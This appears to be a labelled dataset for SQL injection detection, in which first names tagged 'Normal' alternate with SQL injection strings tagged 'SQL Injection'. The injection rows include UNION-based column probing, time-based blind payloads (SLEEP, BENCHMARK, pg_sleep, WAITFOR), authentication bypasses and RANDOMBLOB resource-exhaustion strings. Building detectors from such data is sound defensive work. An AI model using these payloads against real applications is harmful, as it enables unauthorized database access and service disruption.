"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
'Eve',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
'Hank',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
'David',Normal
'admin') or '1'='1'#',SQL Injection
"'UNION ALL SELECT 1,2,3,4'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
'ORDER BY 26--',SQL Injection
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4--'",SQL Injection
'Jill',Normal
'Jill',Normal
'Fran',Normal
'John',Normal
'Fran',Normal
'Fran',Normal
'Fran',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7--'",SQL Injection
'Bob',Normal
'David',Normal
'Jill',Normal
'ORDER BY 21',SQL Injection
'Charlie',Normal
'Eve',Normal
'David',Normal
'David',Normal
'Bob',Normal
'John',Normal
"'"""" or pg_sleep(5)--'",SQL Injection
"'"""")) or ((""""x""""))=((""""x'",SQL Injection
'Charlie',Normal
'Bob',Normal
'Bob',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
'Alice',Normal
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
'OR 1=1--',SQL Injection
'Alice',Normal
'Fran',Normal
'Hank',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
'ORDER BY 2--',SQL Injection
'David',Normal
Microservice running on port 3000,Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
'Hank',Normal
'Fran',Normal
'1)) or pg_sleep(5)--',SQL Injection
'Fran',Normal
"'"""")) or ((""""x""""))=((""""x'",SQL Injection
'Hank',Normal
'Jill',Normal
"'1' GROUP BY 1,2,--+'",SQL Injection
'Hank',Normal
'Hank',Normal
'ORDER BY 27',SQL Injection
'Bob',Normal
'Alice',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Bob',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'",SQL Injection
'Charlie',Normal
'Jill',Normal
'John',Normal
'OR 1=1',SQL Injection
'Fran',Normal
'Grace',Normal
'David',Normal
'ORDER BY 27',SQL Injection
'Fran',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
'Jill',Normal
'Alice',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))'",SQL Injection
'ORDER BY 26#',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'",SQL Injection
'' OR '1'='1',SQL Injection
'David',Normal
'Bob',Normal
'\',SQL Injection
'David',Normal
'Eve',Normal
'Eve',Normal
'David',Normal
'Charlie',Normal
'Charlie',Normal
'Bob',Normal
'Fran',Normal
'Fran',Normal
'pg_SLEEP(5)#',SQL Injection
'Grace',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'",SQL Injection
'Charlie',Normal
'Eve',Normal
'Charlie',Normal
"'"""" or """"""""^""""'",SQL Injection
'Alice',Normal
'Grace',Normal
'Alice',Normal
';%00	Nullbyte',SQL Injection
'Hank',Normal
'David',Normal
'Grace',Normal
'Grace',Normal
'John',Normal
'Bob',Normal
'Hank',Normal
'ORDER BY 26#',SQL Injection
'Hank',Normal
'Alice',Normal
'ORDER BY 14',SQL Injection
'Fran',Normal
'``',SQL Injection
'John',Normal
'' GROUP BY columnnames having 1=1 --',SQL Injection
'' GROUP BY columnnames having 1=1 --',SQL Injection
'Eve',Normal
'Comments:',SQL Injection
'John',Normal
'David',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'",SQL Injection
'ORDER BY 2#',SQL Injection
'Charlie',Normal
'Hank',Normal
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5#'",SQL Injection
'Eve',Normal
'Alice',Normal
'Grace',Normal
'Jill',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
"'-1' UNION SELECT 1,2,3--+'",SQL Injection
'Eve',Normal
'Hank',Normal
'OR 1=0#',SQL Injection
'John',Normal
'Grace',Normal
'Grace',Normal
'or pg_SLEEP(5)#',SQL Injection
'Fran',Normal
"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
'Grace',Normal
"'"""" or """"""""&""""'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
'Eve',Normal
'UNION ALL SELECT 1',SQL Injection
'ORDER BY 23#',SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Charlie',Normal
'OR 1=0--',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
'John',Normal
'RANDOMBLOB(1000000000/2)',SQL Injection
'Alice',Normal
'Fran',Normal
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
'Grace',Normal
'Grace',Normal
'Jill',Normal
"'""""""""'",SQL Injection
'\\',SQL Injection
'Alice',Normal
'Grace',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
"'' or benchmark(10000000,MD5(1))#'",SQL Injection
'Fran',Normal
'Jill',Normal
'Fran',Normal
'Jill',Normal
'Eve',Normal
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
'David',Normal
'Alice',Normal
'John',Normal
'&&SLEEP(5)--',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'Eve',Normal
'Alice',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
'1)) or pg_sleep(5)--',SQL Injection
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
"'SLEEP(5)=""""'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
'Eve',Normal
'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
'Bob',Normal
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
'Bob',Normal
'Eve',Normal
'UNION ALL SELECT 1',SQL Injection
'Bob',Normal
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
'Bob',Normal
'admin' or 1=1--',SQL Injection
'David',Normal
'admin' or 1=1#',SQL Injection
'David',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
'Jill',Normal
'David',Normal
'David',Normal
'Jill',Normal
'Jill',Normal
'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
'Fran',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'",SQL Injection
"'"""" or """"x""""=""""x'",SQL Injection
'Bob',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
'David',Normal
'Eve',Normal
'Eve',Normal
"'"""";",SQL Injection
'Bob',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))'",SQL Injection
"'and (select substring(@@version,1,1))='M''",SQL Injection
'Jill',Normal
'John',Normal
'Jill',Normal
'Fran',Normal
'Hank',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'",SQL Injection
'Fran',Normal
'Fran',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
'' or ''*'',SQL Injection
'John',Normal
'David',Normal
"'admin"""") or """"1""""=""""1""""--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
'Grace',Normal
'Eve',Normal
'Hank',Normal
'John',Normal
"'admin"""" or """"1""""=""""1'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'",SQL Injection
'Eve',Normal
'';WAITFOR DELAY '0:0:30'--',SQL Injection
'Eve',Normal
'John',Normal
'ORDER BY 28--',SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
''-'',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
'David',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#'",SQL Injection
'AND 7506=9091 AND ('5913=5913',SQL Injection
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
'David',Normal
'Hank',Normal
'Fran',Normal
"'-1' UNION SELECT 1,2,3--+'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
'Jill',Normal
'ORDER BY SLEEP(5)--',SQL Injection
'ORDER BY 6--',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
'Fran',Normal
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'",SQL Injection
'ORDER BY 5',SQL Injection
'Jill',Normal
'Jill',Normal
'Eve',Normal
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
'Fran',Normal
'John',Normal
'#	    Hash comment',SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
'Alice',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
'ORDER BY SLEEP(5)--',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'Grace',Normal
'John',Normal
'%		wildcard attribute indicator',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
'John',Normal
'Eve',Normal
'Grace',Normal
'Grace',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#'",SQL Injection
'Hank',Normal
'Jill',Normal
'Fran',Normal
'RANDOMBLOB(500000000/2)',SQL Injection
'Eve',Normal
'' or true--',SQL Injection
'ORDER BY SLEEP(5)',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'",SQL Injection
'John',Normal
'' AND 1=0 UNION ALL SELECT 'malicious_data',SQL Injection
'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
'ORDER BY 25--',SQL Injection
"'') or benchmark(10000000,MD5(1))#'",SQL Injection
'# from wapiti',SQL Injection
'admin') or '1'='1'#',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
'Eve',Normal
'Hank',Normal
'Bob',Normal
"'""""^""""'",SQL Injection
'Eve',Normal
'Fran',Normal
'Bob',Normal
'Jill',Normal
'Fran',Normal
'pg_sleep(5)--',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'",SQL Injection
'ORDER BY 25--',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
'Grace',Normal
'Bob',Normal
Microservice running on port 5400,Normal
'ORDER BY 12--',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'",SQL Injection
'admin' --',SQL Injection
'Hank',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
'John',Normal
"'UNION ALL SELECT 1,2,3'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
'Jill',Normal
'John',Normal
'admin' or '1'='1'/*',SQL Injection
'Hank',Normal
'Alice',Normal
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
"',(select * from (select(sleep(10)))a)'",SQL Injection
'Charlie',Normal
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
'David',Normal
'Charlie',Normal
'Alice',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
'David',Normal
'David',Normal
'Jill',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'",SQL Injection
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'Eve',Normal
'Jill',Normal
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#'",SQL Injection
'Grace',Normal
'John',Normal
'Jill',Normal
"'1' ORDER BY 1,2--+'",SQL Injection
'ORDER BY 12--',SQL Injection
'Bob',Normal
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
'Hank',Normal
'John',Normal
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'",SQL Injection
"'admin"""") or (""""1""""=""""1""""/*'",SQL Injection
"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
'Eve',Normal
'Fran',Normal
'Alice',Normal
'Jill',Normal
'Alice',Normal
'Bob',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
'Alice',Normal
'Grace',Normal
'WHERE 1=1 AND 1=0--',SQL Injection
'HAVING 1=1--',SQL Injection
'Grace',Normal
'Bob',Normal
'Grace',Normal
'Hank',Normal
'Grace',Normal
'Fran',Normal
'Alice',Normal
'ORDER BY 13#',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
'' or '' '',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
'Eve',Normal
'1 AND (SELECT * FROM Users) = 1',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9#'",SQL Injection
'John',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
'John',Normal
'Fran',Normal
'John',Normal
'John',Normal
'Fran',Normal
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
'Fran',Normal
'ORDER BY 4#',SQL Injection
'Jill',Normal
"'and (select substring(@@version,3,1))='S''",SQL Injection
'Charlie',Normal
'Grace',Normal
'') or true--',SQL Injection
'Grace',Normal
'Grace',Normal
'WHERE 1=1 AND 1=0',SQL Injection
"'-1' UNION SELECT 1,2,3--+'",SQL Injection
'John',Normal
'Jill',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'",SQL Injection
');,SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
'Jill',Normal
'Bob',Normal
'Fran',Normal
'John',Normal
'Eve',Normal
'Eve',Normal
'Jill',Normal
"'1' GROUP BY 1,2,3--+'",SQL Injection
'Hank',Normal
'Fran',Normal
'AND true',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'",SQL Injection
'Alice',Normal
'Fran',Normal
'Alice',Normal
'Charlie',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'",SQL Injection
'ORDER BY 1--',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
'Jill',Normal
'AND 1',SQL Injection
'&&SLEEP(5)',SQL Injection
'Eve',Normal
"'"""")) or benchmark(10000000,MD5(1))#'",SQL Injection
'Eve',Normal
'Grace',Normal
'OR 1=0--',SQL Injection
'John',Normal
'ORDER BY 13#',SQL Injection
'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),4#'",SQL Injection
'Jill',Normal
'ORDER BY 24#',SQL Injection
"'1) or benchmark(10000000,MD5(1))#'",SQL Injection
'Bob',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'",SQL Injection
''&&SLEEP(5)&&'1',SQL Injection
"'benchmark(50000000,MD5(1))'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--'",SQL Injection
'Charlie',Normal
"'"""") or true--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3'",SQL Injection
'John',Normal
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9--'",SQL Injection
'Alice',Normal
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
"'"""") or benchmark(10000000,MD5(1))#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
'UNION ALL SELECT SLEEP(5)--',SQL Injection
'Fran',Normal
''LIKE'',SQL Injection
'Eve',Normal
'Charlie',Normal
''',SQL Injection
'Charlie',Normal
"'""""""""'",SQL Injection
'Eve',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),3,4--'",SQL Injection
'Hank',Normal
'Charlie',Normal
'Alice',Normal
'Eve',Normal
'WHERE 1=1 AND 1=0#',SQL Injection
'Bob',Normal
"'and (select substring(@@version,3,1))='X''",SQL Injection
'Jill',Normal
'ORDER BY 16',SQL Injection
'Jill',Normal
'Grace',Normal
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
'''',SQL Injection
